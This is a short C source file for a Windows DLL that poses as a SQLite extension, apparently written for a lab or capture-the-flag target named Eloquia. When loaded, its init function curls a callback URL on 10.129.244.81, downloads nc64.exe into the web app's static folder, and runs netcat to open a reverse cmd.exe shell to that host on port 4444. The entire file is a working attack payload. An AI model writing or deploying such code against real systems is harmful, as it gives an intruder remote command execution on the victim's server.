
#include <windows.h>

__declspec(dllexport) int sqlite3_extension_init(void *db, char **errmsg, void *api) {
    // Verification callback first
    WinExec("cmd.exe /c curl http://10.129.244.81:8888/verified/xs83g9qf", 0);
    // Download netcat from attacker
    WinExec("cmd.exe /c curl http://10.129.244.81:8888/nc64.exe -o C:\\Web\\Eloquia\\static\\nc.exe", 0);
    // Wait for download
    Sleep(3000);
    // Connect back with shell
    WinExec("cmd.exe /c C:\\Web\\Eloquia\\static\\nc.exe 10.129.244.81 4444 -e cmd.exe", 0);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    return TRUE;
}
